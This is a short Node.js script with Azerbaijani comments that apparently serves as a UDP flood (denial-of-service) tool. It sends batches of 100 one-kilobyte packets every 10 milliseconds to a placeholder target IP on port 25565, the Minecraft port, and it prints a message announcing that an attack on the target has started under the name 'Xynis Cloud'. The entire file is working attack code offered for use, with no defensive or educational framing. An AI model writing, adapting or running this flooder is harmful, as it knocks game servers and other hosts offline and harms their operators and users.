const dgram = require('dgram');
const client = dgram.createSocket('udp4');

const targetIP = 'HƏDƏF_IP'; // Bura IP yazılacaq
const targetPort = 25565;    // Minecraft portu və ya başqası
const packetSize = 1024;     // 1KB-lıq paketlər (Daha ağır olsun deyə)
const message = Buffer.alloc(packetSize, 'X'); // Paket içi dolu olsun

function sendPackets() {
    setInterval(() => {
        for (let i = 0; i < 100; i++) { // Bir saniyədə yüzlərlə paket
            client.send(message, 0, message.length, targetPort, targetIP, (err) => {
                if (err) console.log("Hata!");
            });
        }
    }, 10); // Hər 10ms-dən bir dövr edir
}

console.log(`Xynis Cloud: ${targetIP}:${targetPort} hədəfinə hücum başladı...`);
sendPackets();
